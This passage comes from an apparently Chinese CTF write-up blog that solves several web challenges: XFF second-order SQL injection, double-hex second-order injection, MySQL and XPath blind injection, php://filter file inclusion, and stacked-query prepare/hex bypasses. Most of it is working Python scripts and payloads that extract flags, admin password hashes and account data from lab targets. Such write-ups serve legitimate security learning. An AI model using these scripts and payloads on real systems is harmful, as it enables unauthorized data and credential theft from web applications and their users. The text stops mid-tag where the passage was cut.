id="题解-v2">题解</h3><p>这道题的注入点在X-Forwarded-For，利用XFF来更改IP地址，可以发现IP被保存并输出了。</p><p>既然他的last-ip和current-ip会更新，由此可以猜想他与数据库进行了交互</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (<span class="keyword">current</span>-ip,<span class="keyword">last</span>-ip ) <span class="keyword">VALUES</span> (<span class="string">&#x27;$current-ip&#x27;</span>,<span class="string">&#x27;$last-ip&#x27;</span> );</span><br></pre></td></tr></table></figure><p>由于这题有回显，因此，可以考虑二次注入。</p><p>首先用下面这个payload验证一下能不能成功地闭合语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39; or ascii(substr((select(database())),1,1))&gt;100 or &#39;0</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181214.png" alt=""></p><p>再随便输入</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181937.png" alt=""></p><p>再次发送请求</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721182026.png" alt=""></p><p>验证成功，接下来就是写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.buuoj.cn:29354/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个head头好像必须加cookie</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=60661451-cdab-4a74-95b4-74d6a66945a9&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># #查库名</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #查表名</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #查列名</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;插入sql语句&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload1 = payload.format(i, mid)</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = payload1</span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;重新发送两次请求&#x27;&#x27;&#x27;</span></span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;penson&quot;</span></span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line">        r = requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: 1 &quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="拓展-v2">拓展</h3><p>更多的闭合方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (payload) or &#39;</span><br><span class="line">&#39; and (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;&#x3D;&#39;</span><br><span class="line">&#39;* (payload) *&#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&quot; – (payload) – &quot;</span><br></pre></td></tr></table></figure><p>还有一种payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0</span><br></pre></td></tr></table></figure><p>注意：一次不能读太多位，不然10进制会用科学计数法表示，就无法转换回原字符串了。</p><h2 id="网鼎杯2018-Unfinished">网鼎杯2018 Unfinished</h2><h3 id="考点-v19">考点</h3><ul><li>二次注入</li><li>两次Hex编码</li></ul><h3 id="解题-v17">解题</h3><p>登陆的时候用到的是邮箱和密码，而注册的时候还有一个用户名，而这个用户名却在登陆后显示了，所以我们考虑用户名这里可能存在 <strong>二次注入</strong>。</p><p>注册成功，会得到 <strong>302</strong> 状态码并跳转至 <strong>login.php</strong> ；如果注册失败，只会返回 <strong>200</strong> 状态码。所以构造 <strong>payload</strong> 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email&#x3D;test@666.com&amp;username&#x3D;0&#39;%2B(select hex(hex(database())))%2B&#39;0&amp;password&#x3D;test</span><br></pre></td></tr></table></figure><p>在这里解释一下为什么要两次hex加密：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721213306.png" alt=""></p><p>上面这张图展示的是，如果字符串hex后的值中包含字母，在与0相加后只能显示字母之前的数字与0相加的结果。两次hex编码可以解决这个问题。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721214124.png" alt=""></p><p>然后这里还要注意一个问题，就是当数据进过 <strong>两次hex</strong> 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，就无法还原本身的字符串。</p><p>所以这里我们使用 substr 每次取10个字符长度与 ‘0’ 相加，这样就不会丢失数据。但是这里使用逗号 <strong>,</strong> 会出错，所以可以使用类似 substr(‘test’ from 1 for 10) 这种写法来绕过，具体获取 <strong>flag</strong> 的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;%2b(select substr(hex(hex((select * from flag))) from 1 for 10))%2b&#39;0</span><br></pre></td></tr></table></figure><p>注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7fb57b69-428d-4c33-8988-d08449ffb183.node3.buuoj.cn/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select * from flag&quot;</span></span><br><span class="line"></span><br><span class="line">email = [<span class="string">&quot;test0&quot;</span> + str(i) + <span class="string">&quot;@aa.aa&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>)]  <span class="comment"># 这里次数可以通过sql爆破flag长度得到，或者也可fuzz</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">email, offset</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;0&quot;</span>.format(sql, str(<span class="number">1</span> + offset * <span class="number">10</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req = requests.post(url + <span class="string">&quot;/register.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">email</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;/login.php&quot;</span>, data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    pattern = <span class="string">&#x27;&lt;span class=\&quot;user-name\&quot;&gt;\s*(\d&#123;1,10&#125;)\s*&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    raw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> email, offset <span class="keyword">in</span> zip(email, range(<span class="number">0</span>, len(email))):</span><br><span class="line">        register(email, offset)</span><br><span class="line">        test = login(email)</span><br><span class="line">        print(test)</span><br><span class="line">        raw += test</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[-] Double Hex : -&gt; %s &lt;-\r&quot;</span> % (raw))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;[+] Double Hex : -&gt; &#123;&#125; &lt;-&quot;</span>.format(raw))</span><br></pre></td></tr></table></figure><h2 id="BlackWatch-入群题-Web">BlackWatch 入群题 Web</h2><h3 id="考点-v20">考点</h3><ul><li>MySQL盲注</li></ul><h3 id="解题-v18">解题</h3><p>盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b5ee7e6-71d1-4280-9dd3-6e27f0650b68.node3.buuoj.cn/backend/content_detail.php?id=&quot;</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = head + tail &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;contents&#x27;)),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d,3,2)&quot;</span> % (i, mid)</span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload, proxies=proxies)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># print(r.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Yunen&quot;</span> <span class="keyword">in</span> str(r.json()):</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        name += chr(head)</span><br><span class="line">        print(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezlogin">NPUCTF2020 ezlogin</h2><h3 id="考点-v21">考点</h3><ul><li><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">Xpath注入</a></li></ul><h3 id="解题-v19">解题</h3><table><thead><tr><th>payload</th><th>含义</th></tr></thead><tbody><tr><td>’ or count(/)=1 or '1</td><td>判断有几个根节点</td></tr><tr><td>’ or string-count(name(/*[1]))=1 or '1</td><td>获取根节点长度</td></tr><tr><td>'or substring(name(/*[1]), 1, 1)=‘a’ or '1</td><td>获取内容</td></tr></tbody></table><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://90cceea4-fbed-4c2b-97de-a43474dea042.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">strs = string.digits + string.ascii_letters</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">find = re.compile(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = sess.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="comment"># 根节点root</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i, j, token[0])</span></span><br><span class="line">            <span class="comment"># root子节点accounts</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># accounts子节点user</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># user子节点id, username, password</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            data = <span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.format(</span><br><span class="line">                i, j, token[<span class="number">0</span>])</span><br><span class="line">            res = sess.get(url=url, headers=headers, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                result += j</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后可以判断格式为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>gtfly123<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>adm1n<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>password无法解密，使用<code>adm1n gtfly123</code>登录站点。</p><p>查看网页源代码，提示：<code>flag is in /flag</code></p><p>存在文件包含，使用大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php?file&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;convert.BASE64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="SUCTF2018-MultiSQL">SUCTF2018 MultiSQL</h2><h3 id="考点-v22">考点</h3><ul><li>堆叠注入</li><li>MySQL预编译绕过</li></ul><h3 id="解题-v20">解题</h3><p>首先来演示一下MySQL预编译</p><h4 id="set">set</h4><p>set 的作用就是定义一个变量，变量的命名必须是@开头。</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014115534.png" style="zoom:50%;" /><h4 id="prepare和execute">prepare和execute</h4><p>prepare语句用于预定义一个语句，并可以指定预定义语句名称。execute则是执行预定义语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prepare prepare_name from “sql语句”</span><br><span class="line"></span><br><span class="line">execute prepare_name</span><br></pre></td></tr></table></figure><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014115731.png" style="zoom:50%;" /><p>结合起来利用就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; set @a&#x3D;&#39;select version()&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; prepare t from @a;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; execute t;</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.20    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>用上面的知识再结合16进制编码，这样就可以绕过对一些关键字(select,from之类的)的过滤。</p><p>比如：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014120236.png" alt=""></p><p>回到题目，注册成功后登陆查看资料，发现url如下：</p><p><code>http://87e3250e-37a7-472a-b4e3-764ad942514d.node3.buuoj.cn/user/user.php?id=2</code></p><p>id处可能有SQL注入，过滤了单引号还有一些关键字，用异或注入：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014155145.png" alt=""></p><p>由于过滤了<code>union，select ，&amp;，|</code>还有一些函数，只能Get Shell才能拿到flag。</p><blockquote><p>存在SQL注入的题目都可以直接load_file盲注flag。</p></blockquote><p>查看<code>secure_file_priv</code>配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o5lhvid6588d0rgkgieh1vne75&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">char = string.ascii_lowercase + string.digits + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;2-(@@secure_file_priv&lt;BINARY(0x&#123;0&#125;))&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">hex = <span class="keyword">lambda</span> s: binascii.b2a_hex(s.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        c = chr(i)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        _url = url + payload.format(flag+hex(c))</span><br><span class="line">        res = r.get(url=_url, cookies=cookies)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            data += chr(i<span class="number">-1</span>)</span><br><span class="line">            flag += hex(chr(i<span class="number">-1</span>))</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>盲注出<code>secure_file_priv=/var/www/</code></p><p>使用load_file函数读取index.php文件</p><figure class="highlight python"><table><tr><td 